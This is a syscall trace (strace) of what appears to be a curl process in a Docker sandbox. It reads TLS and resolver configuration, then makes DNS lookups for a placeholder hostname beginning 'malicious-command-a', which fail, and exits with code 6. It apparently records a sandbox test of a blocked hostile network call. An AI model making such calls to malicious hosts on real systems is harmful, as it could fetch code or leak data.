22    14:56:49.479778 mprotect(0x74e6ecfc8000, 4096, PROT_READ) = 0
22    14:56:49.480111 mprotect(0x74e6ed2d5000, 4096, PROT_READ) = 0
22    14:56:49.480588 mprotect(0x74e6ed038000, 8192, PROT_READ) = 0
22    14:56:49.480993 mprotect(0x74e6ed058000, 4096, PROT_READ) = 0
22    14:56:49.481352 mprotect(0x74e6ed0a5000, 12288, PROT_READ) = 0
22    14:56:49.481828 mprotect(0x74e6ed391000, 16384, PROT_READ) = 0
22    14:56:49.482162 mprotect(0x74e6ed39d000, 4096, PROT_READ) = 0
22    14:56:49.482530 mprotect(0x60522526d000, 20480, PROT_READ) = 0
22    14:56:49.482906 mprotect(0x74e6ed3d7000, 8192, PROT_READ) = 0
22    14:56:49.483266 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
22    14:56:49.483619 munmap(0x74e6ed398000, 7295) = 0
22    14:56:49.484054 getrandom("\x05\x70\xe6\x17\xdd\xee\x54\x65", 8, GRND_NONBLOCK) = 8
22    14:56:49.484386 brk(NULL)         = 0x60523e066000
22    14:56:49.484708 brk(0x60523e087000) = 0x60523e087000
22    14:56:49.485367 getrandom("\xb2", 1, GRND_NONBLOCK) = 1
22    14:56:49.485733 newfstatat(AT_FDCWD</sandbox>, "/etc/gnutls/config", {st_mode=S_IFREG|0644, st_size=119, ...}, 0) = 0
22    14:56:49.486151 openat(AT_FDCWD</sandbox>, "/etc/gnutls/config", O_RDONLY|O_CLOEXEC) = 3</etc/gnutls/config>
22    14:56:49.486513 fstat(3</etc/gnutls/config>, {st_mode=S_IFREG|0644, st_size=119, ...}) = 0
22    14:56:49.486902 brk(0x60523e0a8000) = 0x60523e0a8000
22    14:56:49.487235 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
22    14:56:49.487581 read(3</etc/gnutls/config>, "", 4096) = 0
22    14:56:49.487911 lseek(3</etc/gnutls/config>, 0, SEEK_SET) = 0
22    14:56:49.488239 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
22    14:56:49.488585 read(3</etc/gnutls/config>, "", 4096) = 0
22    14:56:49.488916 close(3</etc/gnutls/config>) = 0
22    14:56:49.489246 brk(0x60523e0a7000) = 0x60523e0a7000
22    14:56:49.489727 fcntl(0<pipe:[589]>, F_GETFD) = 0
22    14:56:49.490112 fcntl(1<pipe:[2809]>, F_GETFD) = 0
22    14:56:49.490635 fcntl(2<pipe:[2810]>, F_GETFD) = 0
22    14:56:49.491161 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
22    14:56:49.491662 futex(0x74e6ecf093ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.492043 futex(0x74e6ecf093e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.492454 futex(0x74e6ecf093d8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.492814 futex(0x74e6ecf094e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.493257 futex(0x74e6ecf093c8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.493625 futex(0x74e6ecf093c0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.494026 openat(AT_FDCWD</sandbox>, "/proc/sys/crypto/fips_enabled", O_RDONLY) = -1 ENOENT (No such file or directory)
22    14:56:49.494396 futex(0x74e6ecf090ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.494776 futex(0x74e6ecf08f08, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.495105 futex(0x74e6ecf08e44, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.495426 futex(0x74e6ecf09424, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.495754 futex(0x74e6ecf08e38, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.496279 futex(0x74e6ecf093d0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.496619 openat(AT_FDCWD</sandbox>, "/usr/lib/ssl/openssl.cnf", O_RDONLY) = 3</etc/ssl/openssl.cnf>
22    14:56:49.497138 fstat(3</etc/ssl/openssl.cnf>, {st_mode=S_IFREG|0644, st_size=12324, ...}) = 0
22    14:56:49.497536 read(3</etc/ssl/openssl.cnf>, "#\n# OpenSSL example configuratio"..., 4096) = 4096
22    14:56:49.497921 read(3</etc/ssl/openssl.cnf>, "d attributes must be the same, a"..., 4096) = 4096
22    14:56:49.498293 read(3</etc/ssl/openssl.cnf>, "coding of an extension: beware e"..., 4096) = 4096
22    14:56:49.498691 read(3</etc/ssl/openssl.cnf>, " = $insta::certout # insta.cert."..., 4096) = 36
22    14:56:49.499056 read(3</etc/ssl/openssl.cnf>, "", 4096) = 0
22    14:56:49.499392 close(3</etc/ssl/openssl.cnf>) = 0
22    14:56:49.499729 futex(0x74e6ecf08bf8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.500088 futex(0x74e6ecf08c54, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.500414 futex(0x74e6ecf09394, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.500735 futex(0x74e6ecf08bd8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.501069 futex(0x74e6ecf093b8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.501389 futex(0x74e6ecfb5844, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.501721 futex(0x74e6ecfb5864, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    14:56:49.502122 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
22    14:56:49.502504 openat(AT_FDCWD</sandbox>, "/home/analyst/.config/curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
22    14:56:49.502895 geteuid()         = 1001
22    14:56:49.503231 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[596]>
22    14:56:49.503582 connect(3<socket:[596]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
22    14:56:49.503943 close(3<socket:[596]>) = 0
22    14:56:49.504278 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[597]>
22    14:56:49.504716 connect(3<socket:[597]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
22    14:56:49.505072 close(3<socket:[597]>) = 0
22    14:56:49.505405 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
22    14:56:49.505744 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
22    14:56:49.506079 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
22    14:56:49.506422 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
22    14:56:49.506811 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
22    14:56:49.507349 read(3</etc/nsswitch.conf>, "", 4096) = 0
22    14:56:49.507813 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
22    14:56:49.508202 close(3</etc/nsswitch.conf>) = 0
22    14:56:49.508566 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
22    14:56:49.508933 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
22    14:56:49.509267 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
22    14:56:49.509592 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
22    14:56:49.509926 close(3</etc/passwd>) = 0
22    14:56:49.510280 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
22    14:56:49.510689 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.511016 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.511342 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.511671 ioctl(1<pipe:[2809]>, TCGETS, 0x7ffe2b7b73b0) = -1 ENOTTY (Inappropriate ioctl for device)
22    14:56:49.512026 ioctl(0<pipe:[589]>, TIOCGWINSZ, 0x7ffe2b7b74e0) = -1 ENOTTY (Inappropriate ioctl for device)
22    14:56:49.512372 pipe2([3<pipe:[598]>, 4<pipe:[598]>], 0) = 0
22    14:56:49.512728 fcntl(3<pipe:[598]>, F_GETFL) = 0 (flags O_RDONLY)
22    14:56:49.513054 fcntl(3<pipe:[598]>, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
22    14:56:49.513377 fcntl(4<pipe:[598]>, F_GETFL) = 0x1 (flags O_WRONLY)
22    14:56:49.513698 fcntl(4<pipe:[598]>, F_SETFL, O_WRONLY|O_NONBLOCK) = 0
22    14:56:49.514073 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.514429 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.514760 poll([{fd=3<pipe:[598]>, events=POLLIN}], 1, 0) = 0 (Timeout)
22    14:56:49.515094 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.515417 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.515743 brk(0x60523e0dc000) = 0x60523e0dc000
22    14:56:49.516085 socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 5<socket:[599]>
22    14:56:49.516437 close(5<socket:[599]>) = 0
22    14:56:49.516836 pipe2([5<pipe:[600]>, 6<pipe:[600]>], 0) = 0
22    14:56:49.517240 rt_sigaction(SIGRT_1, {sa_handler=0x74e6ed142610, sa_mask=[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_RESTART|SA_SIGINFO, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.517561 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
22    14:56:49.517880 mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x74e6eb871000
22    14:56:49.518207 mprotect(0x74e6eb872000, 8388608, PROT_READ|PROT_WRITE) = 0
22    14:56:49.518542 rt_sigprocmask(SIG_BLOCK, ~[], [], 8) = 0
22    14:56:49.518898 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x74e6ec071990, parent_tid=0x74e6ec071990, exit_signal=0, stack=0x74e6eb871000, stack_size=0x7ffd80, tls=0x74e6ec0716c0}, 88) = -1 ENOSYS (Function not implemented)
22    14:56:49.519234 clone(child_stack=0x74e6ec070d70, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tid=[23], tls=0x74e6ec0716c0, child_tidptr=0x74e6ec071990) = 23
23    14:56:49.519672 rseq(0x74e6ec071fe0, 0x20, 0, 0x53053053 <unfinished ...>
22    14:56:49.519812 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
23    14:56:49.519955 <... rseq resumed>) = 0
22    14:56:49.520080 <... rt_sigprocmask resumed>NULL, 8) = 0
23    14:56:49.520201 set_robust_list(0x74e6ec0719a0, 24 <unfinished ...>
22    14:56:49.520321 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.520450 <... set_robust_list resumed>) = 0
22    14:56:49.520628 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.520766 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
22    14:56:49.520937 poll([{fd=5<pipe:[600]>, events=POLLIN}, {fd=3<pipe:[598]>, events=POLLIN}], 2, 1 <unfinished ...>
23    14:56:49.521121 <... rt_sigprocmask resumed>NULL, 8) = 0
23    14:56:49.521304 mmap(NULL, 134217728, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6e3871000
23    14:56:49.521634 munmap(0x74e6e3871000, 7925760) = 0
23    14:56:49.521970 munmap(0x74e6e8000000, 59183104) = 0
22    14:56:49.522317 <... poll resumed>) = 0 (Timeout)
23    14:56:49.522453 mprotect(0x74e6e4000000, 135168, PROT_READ|PROT_WRITE <unfinished ...>
22    14:56:49.522599 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    14:56:49.522728 <... mprotect resumed>) = 0
22    14:56:49.522846 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
23    14:56:49.522990 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0 <unfinished ...>
22    14:56:49.523127 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.523256 <... socket resumed>) = 7<socket:[4654]>
22    14:56:49.523397 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.523516 connect(7<socket:[4654]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110 <unfinished ...>
22    14:56:49.523651 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.523871 <... connect resumed>) = -1 ENOENT (No such file or directory)
22    14:56:49.524216 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.524537 close(7<socket:[4654]> <unfinished ...>
22    14:56:49.524769 poll([{fd=5<pipe:[600]>, events=POLLIN}, {fd=3<pipe:[598]>, events=POLLIN}], 2, 1 <unfinished ...>
23    14:56:49.524951 <... close resumed>) = 0
23    14:56:49.525172 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7<socket:[4655]>
23    14:56:49.525619 connect(7<socket:[4655]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
23    14:56:49.526053 close(7<socket:[4655]> <unfinished ...>
22    14:56:49.526257 <... poll resumed>) = 0 (Timeout)
23    14:56:49.526434 <... close resumed>) = 0
22    14:56:49.526664 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    14:56:49.526855 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf",  <unfinished ...>
22    14:56:49.527058 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
23    14:56:49.527253 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
22    14:56:49.527425 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.527597 newfstatat(AT_FDCWD</sandbox>, "/etc/resolv.conf",  <unfinished ...>
22    14:56:49.527763 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.527914 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=312, ...}, 0) = 0
22    14:56:49.528069 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.528220 openat(AT_FDCWD</sandbox>, "/etc/host.conf", O_RDONLY|O_CLOEXEC <unfinished ...>
22    14:56:49.528379 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.528529 <... openat resumed>) = 7</etc/host.conf>
22    14:56:49.528685 poll([{fd=5<pipe:[600]>, events=POLLIN}, {fd=3<pipe:[598]>, events=POLLIN}], 2, 4 <unfinished ...>
23    14:56:49.528852 fstat(7</etc/host.conf>, {st_mode=S_IFREG|0644, st_size=92, ...}) = 0
23    14:56:49.529310 read(7</etc/host.conf>, "# The \"order\" line is only used "..., 4096) = 92
23    14:56:49.529692 read(7</etc/host.conf>, "", 4096) = 0
23    14:56:49.530065 close(7</etc/host.conf>) = 0
23    14:56:49.530404 futex(0x74e6ed2b466c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
23    14:56:49.530795 openat(AT_FDCWD</sandbox>, "/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 7</etc/resolv.conf>
23    14:56:49.531156 fstat(7</etc/resolv.conf>, {st_mode=S_IFREG|0644, st_size=312, ...}) = 0
23    14:56:49.531489 read(7</etc/resolv.conf>, "# Generated by Docker Engine.\n# "..., 4096) = 312
23    14:56:49.531829 read(7</etc/resolv.conf>, "", 4096) = 0
23    14:56:49.532176 uname({sysname="Linux", nodename="97c4bc2edabd", ...}) = 0
23    14:56:49.532502 fstat(7</etc/resolv.conf>, {st_mode=S_IFREG|0644, st_size=312, ...}) = 0
23    14:56:49.532836 close(7</etc/resolv.conf> <unfinished ...>
22    14:56:49.532990 <... poll resumed>) = 0 (Timeout)
23    14:56:49.533139 <... close resumed>) = 0
22    14:56:49.533287 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    14:56:49.533430 openat(AT_FDCWD</sandbox>, "/etc/hosts", O_RDONLY|O_CLOEXEC <unfinished ...>
22    14:56:49.533586 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
23    14:56:49.533735 <... openat resumed>) = 7</etc/hosts>
22    14:56:49.533885 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.534046 fstat(7</etc/hosts>,  <unfinished ...>
22    14:56:49.534194 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.534337 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=172, ...}) = 0
22    14:56:49.534486 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.534650 lseek(7</etc/hosts>, 0, SEEK_SET <unfinished ...>
22    14:56:49.534811 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.534955 <... lseek resumed>) = 0
22    14:56:49.535097 poll([{fd=5<pipe:[600]>, events=POLLIN}, {fd=3<pipe:[598]>, events=POLLIN}], 2, 8 <unfinished ...>
23    14:56:49.535261 read(7</etc/hosts>, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 172
23    14:56:49.535608 read(7</etc/hosts>, "", 4096) = 0
23    14:56:49.535951 close(7</etc/hosts>) = 0
23    14:56:49.536289 socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 7<socket:[604]>
23    14:56:49.536681 setsockopt(7<socket:[604]>, SOL_IP, IP_RECVERR, [1], 4) = 0
23    14:56:49.537067 connect(7<socket:[604]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0
23    14:56:49.537421 poll([{fd=7<socket:[604]>, events=POLLOUT}], 1, 0) = 1 ([{fd=7, revents=POLLOUT}])
23    14:56:49.537764 sendmmsg(7<socket:[604]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\25\234\1\0\0\1\0\0\0\0\0\0$malicious-command-a"..., iov_len=58}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=58}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\352\235\1\0\0\1\0\0\0\0\0\0$malicious-command-a"..., iov_len=58}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=58}], 2, MSG_NOSIGNAL) = 2
23    14:56:49.538253 poll([{fd=7<socket:[604]>, events=POLLIN}], 1, 5000) = 1 ([{fd=7, revents=POLLIN}])
23    14:56:49.538663 ioctl(7<socket:[604]>, FIONREAD, [58]) = 0
23    14:56:49.539009 recvfrom(7<socket:[604]>, "\352\235\201\2\0\1\0\0\0\0\0\0$malicious-command-a"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 58
23    14:56:49.539411 poll([{fd=7<socket:[604]>, events=POLLIN}], 1, 4998) = 1 ([{fd=7, revents=POLLIN}])
23    14:56:49.539775 ioctl(7<socket:[604]>, FIONREAD, [58]) = 0
23    14:56:49.540125 recvfrom(7<socket:[604]>, "\25\234\201\2\0\1\0\0\0\0\0\0$malicious-command-a"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 58
23    14:56:49.540592 poll([{fd=7<socket:[604]>, events=POLLOUT}], 1, 0) = 1 ([{fd=7, revents=POLLOUT}])
23    14:56:49.541090 sendmmsg(7<socket:[604]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\25\234\1\0\0\1\0\0\0\0\0\0$malicious-command-a"..., iov_len=58}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=58}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\352\235\1\0\0\1\0\0\0\0\0\0$malicious-command-a"..., iov_len=58}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=58}], 2, MSG_NOSIGNAL) = 2
23    14:56:49.541653 poll([{fd=7<socket:[604]>, events=POLLIN}], 1, 5000) = 1 ([{fd=7, revents=POLLIN}])
23    14:56:49.542026 ioctl(7<socket:[604]>, FIONREAD, [58]) = 0
23    14:56:49.542377 recvfrom(7<socket:[604]>, "\352\235\201\2\0\1\0\0\0\0\0\0$malicious-command-a"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 58
23    14:56:49.542774 poll([{fd=7<socket:[604]>, events=POLLIN}], 1, 4997) = 1 ([{fd=7, revents=POLLIN}])
23    14:56:49.543116 recvfrom(7<socket:[604]>, "\25\234\201\2\0\1\0\0\0\0\0\0$malicious-command-a"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 58
22    14:56:49.543451 <... poll resumed>) = 0 (Timeout)
23    14:56:49.543595 close(7<socket:[604]> <unfinished ...>
22    14:56:49.543746 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    14:56:49.543941 <... close resumed>) = 0
22    14:56:49.544097 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
23    14:56:49.544251 write(6<pipe:[600]>, "\1", 1 <unfinished ...>
22    14:56:49.544417 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330},  <unfinished ...>
23    14:56:49.544565 <... write resumed>) = 1
22    14:56:49.544705 <... rt_sigaction resumed>NULL, 8) = 0
23    14:56:49.544846 rt_sigprocmask(SIG_BLOCK, ~[RT_1],  <unfinished ...>
22    14:56:49.544994 futex(0x74e6ec071990, FUTEX_WAIT_BITSET|FUTEX_CLOCK_REALTIME, 23, NULL, FUTEX_BITSET_MATCH_ANY <unfinished ...>
23    14:56:49.545136 <... rt_sigprocmask resumed>NULL, 8) = 0
23    14:56:49.545304 madvise(0x74e6eb871000, 8368128, MADV_DONTNEED) = 0
23    14:56:49.545634 exit(0)           = ?
22    14:56:49.545978 <... futex resumed>) = 0
23    14:56:49.546170 +++ exited with 0 +++
22    14:56:49.546324 close(6<pipe:[600]>) = 0
22    14:56:49.546746 close(5<pipe:[600]>) = 0
22    14:56:49.547140 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.547502 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.547863 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.548246 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.548631 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.548999 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.549369 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.549730 close(3<pipe:[598]>) = 0
22    14:56:49.550093 close(4<pipe:[598]>) = 0
22    14:56:49.550475 brk(0x60523e0c2000) = 0x60523e0c2000
22    14:56:49.550878 brk(0x60523e0c0000) = 0x60523e0c0000
22    14:56:49.551245 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.551589 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.551916 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.552251 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.552589 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, 8) = 0
22    14:56:49.552917 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.553258 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74e6ed0ee330}, NULL, 8) = 0
22    14:56:49.553580 brk(0x60523e0be000) = 0x60523e0be000
22    14:56:49.554229 exit_group(6)     = ?
22    14:56:49.555619 +++ exited with 6 +++
9     14:56:49.555845 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 6}], 0, NULL) = 22
